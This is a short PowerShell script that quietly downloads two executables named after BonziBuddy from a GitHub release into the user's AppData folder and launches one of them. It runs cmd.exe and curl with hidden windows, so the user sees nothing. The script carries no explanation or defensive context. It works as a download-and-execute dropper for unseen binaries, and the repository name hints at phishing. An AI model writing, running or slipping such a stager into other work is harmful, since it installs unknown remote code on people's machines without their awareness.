# Paths to save files
$dest  = "$env:APPDATA\BonsiBuddy.exe"
$dest1 = "$env:APPDATA\Launcher(Bonsi).exe"

# Download Launcher(Bonsi).exe
Start-Process "cmd.exe" `
    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/djgkjd/Launcher.Bonsi.exe"" -o `"$dest1`"" `
    -WindowStyle Hidden `
    -Wait

# Download BonsiBuddy.exe
Start-Process "cmd.exe" `
    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/bro/BonsiBuddy.exe"" -o `"$dest`"" `
    -WindowStyle Hidden `
    -Wait

# Run Launcher(Bonsi).exe
Start-Process $dest1

exit

